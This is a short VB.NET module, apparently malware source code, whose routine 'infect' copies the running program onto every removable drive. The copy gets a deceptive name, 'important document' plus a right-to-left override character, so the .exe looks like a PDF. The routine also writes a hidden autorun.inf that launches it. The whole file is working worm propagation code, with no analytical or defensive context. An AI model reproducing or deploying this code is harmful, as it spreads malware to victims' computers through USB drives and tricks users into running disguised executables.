Imports System.IO

Module Usb
    Public Sub infect()


        For Each Drivg In IO.Directory.GetLogicalDrives
            Dim Driv As New DriveInfo(Drivg)
            If Driv.DriveType = DriveType.Removable Then
                Dim filepath As String = Application.ExecutablePath


                IO.File.Copy(filepath, Drivg & "important document" & ChrW(8238) & Strings.StrReverse(".pdf") & ".exe")


                Dim AutoStart = New StreamWriter(Drivg & "\autorun.inf")
                AutoStart.WriteLine("[autorun]")
                AutoStart.WriteLine("open=" & "important document" & ChrW(8238) & Strings.StrReverse(".pdf") & ".exe")
                AutoStart.WriteLine("shellexecute=" & Drivg, 1)
                AutoStart.Close()
                System.IO.File.SetAttributes(Drivg & "autorun.inf", FileAttributes.Hidden)


            End If
        Next






    End Sub
End Module